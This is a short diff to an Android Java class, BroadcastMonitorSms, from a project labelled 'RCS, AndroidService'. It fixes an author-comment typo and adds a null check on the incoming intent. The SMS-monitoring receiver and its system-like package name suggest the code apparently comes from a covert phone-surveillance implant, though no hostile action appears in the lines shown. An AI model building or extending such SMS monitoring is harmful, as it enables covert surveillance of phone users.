@@ -4,7 +4,7 @@
  * Project      : RCS, AndroidService
  * File         : BroadcastMonitorSms.java
  * Created      : 6-mag-2011
- * Author		: zeno <- menzongne!
+ * Author		: zeno <- menzogne!
  * *******************************************/
 
 package com.android.service.listener;
@@ -24,6 +24,10 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
 	@Override
 	public void onReceive(Context context, Intent intent) {
+		if (intent == null) {
+			return;
+		}
+		
 		final Bundle bundle = intent.getExtras();
 
 		if (bundle == null) {
